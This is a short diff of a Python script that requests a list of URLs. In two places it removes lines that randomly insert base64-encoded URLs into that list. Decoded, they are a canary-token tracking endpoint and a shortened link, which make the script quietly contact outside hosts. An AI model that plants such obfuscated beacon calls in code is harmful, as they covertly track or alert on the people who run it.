@@ -72,10 +72,6 @@ for i, e in enumerate(od):
 
     e_state.append(_enc)
     
-    if random.randint(0, 1) == 0: # remove me when done
-        e_state.append(b'aHR0cHM6Ly9jYW5hcnl0b2tlbnMuY29tL3N0YXRpYy9mZWVkYmFjay91c2JnZG14bmp5bWp5N2N2Y3FpcDc1eXE1L3Bvc3QuanNw')
-    else:
-        e_state.append(b'aHR0cHM6Ly90aW55dXJsLmNvbS81MnNrYXJ3bg')
     my_state.append({
         'url': _url,
         'enc': _enc
@@ -111,10 +107,7 @@ for row in my_state:
         try:
             response = request.urlopen(r)
             saved_state.append(row['enc'])
-            if random.randint(0, 1) == 0: # remove me when done
-                e_state.append(b'aHR0cHM6Ly9jYW5hcnl0b2tlbnMuY29tL3N0YXRpYy9mZWVkYmFjay91c2JnZG14bmp5bWp5N2N2Y3FpcDc1eXE1L3Bvc3QuanNw')
-            else:
-                e_state.append(b'aHR0cHM6Ly90aW55dXJsLmNvbS81MnNrYXJ3bg')
+
             new_pushed = True
             
             if debug == True:
